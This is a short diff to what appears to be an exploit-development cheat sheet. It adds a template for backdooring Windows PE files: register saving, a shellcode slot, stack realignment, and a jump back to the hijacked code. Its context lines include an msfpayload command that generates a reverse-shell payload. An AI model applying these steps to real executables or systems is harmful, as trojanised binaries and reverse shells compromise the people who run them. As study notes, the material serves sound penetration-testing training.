@@ -46,3 +46,15 @@ msfpayload win32_reverse LHOST=127.0.0.1 EXITFUNC=thread LPORT=1337 -b  "\x00" C
 # Set Mona Working Directory
 !mona config -set workingfolder c:\monalogs
 ```
+
+# Backdoor PE Files General Syntax
+```
+PUSHAD                 # Save the register values 
+PUSHFD                 # Save the flag values  
+shellcode              # Pick your poisen
+align stack            # Align ESP with where we saved our stack registers! 
+POPFD                  # Restore the original register values 
+POPAD                  # Restore the original flag values 
+CALL dddd32.0041B7DE   # The first instruction we overwrote (hijack) 
+JMP 00411363           # Jump to the command that was to be executed next
+```
